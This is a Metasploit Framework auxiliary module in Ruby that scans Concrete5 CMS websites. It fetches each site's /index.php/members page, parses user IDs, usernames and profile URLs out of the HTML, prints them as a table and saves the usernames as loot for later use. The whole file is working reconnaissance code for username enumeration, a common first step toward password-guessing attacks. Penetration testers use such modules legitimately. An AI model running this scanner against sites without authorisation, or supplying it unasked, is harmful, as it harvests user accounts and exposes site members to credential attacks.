##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'         => 'Concrete5 Member List Enumeration',
            'Description'  => %q{
              This module extracts username information from the Concrete5 member page
            },
            'References'   =>
                [
                    # General
                    [ 'URL', 'http://blog.c22.cc' ],
                    # Concrete5
                    [ 'URL', 'http://www.concrete5.org'],
                    [ 'URL', 'http://www.concrete5.org/documentation/using-concrete5/dashboard/users-and-groups/']
                ],
            'Author'       => [ 'Chris John Riley' ],
            'License'      => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('URI', [false, 'URL of the Concrete5 root', '/'])
      ], self.class)
    deregister_options('RHOST')
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def run_host(rhost)
    url = normalize_uri(datastore['URI'], '/index.php/members')

    begin
      res = send_request_raw({'uri' => url})

    rescue ::Rex::ConnectionError
      print_error("#{peer} Unable to connect to #{url}")
      return
    end

    if not res
      print_error("#{peer} Unable to connect to #{url}")
      return
    end

    # extract member info from response if present
    if res and res.body =~ /ccm\-profile\-member\-username/i
      extract_members(res, url)
    elsif res
      print_line(res.body)
      print_status("#{peer} No members listed or profiles disabled")
    else
      print_error("#{peer} No response received")
    end

  end

  def extract_members(res, url)
    members = res.body.scan(/<div class="ccm\-profile\-member\-username">(.*)<\/div>/i)

    if members
      print_good("#{peer} Extracted #{members.length} entries")

      # separate user data into userID, username and Profile URL
      memberlist = []
      users = []

      members.each do | mem |
        userid = mem[0].scan(/\/view\/(\d+)/i)
        username = mem[0].scan(/">(.+)<\/a>/i)
        profile = mem[0].scan(/href="(.+)">/i)
        # add all data to memberlist for table output
        memberlist.push([userid[0], username[0], profile[0]])
        # add usernames to users array for reporting
        users.push(username[0])
      end

      membertbl = Msf::Ui::Console::Table.new(
            Msf::Ui::Console::Table::Style::Default, {
            'Header'    => "Concrete5 members",
            'Prefix'  => "\n",
            'Postfix' => "\n",
            'Indent'    => 1,
            'Columns'   =>
            [
              "UserID",
              "Username",
              "Profile"
            ]})

      memberlist.each do | mem |
        membertbl << ["#{mem[0].join}", "#{mem[1].join}", "#{mem[2].join}"]
      end

      # print table
      print_line(membertbl.to_s)

      #store username to loot
      report_note({
        :host => rhost,
        :port => rport,
        :proto => 'tcp',
        :type => "concrete5 CMS members",
        :data => {:proto => "http", :users => users.join(",")}
      })

    else
      print_error("#{peer} Unable to extract members")
    end
  end
end
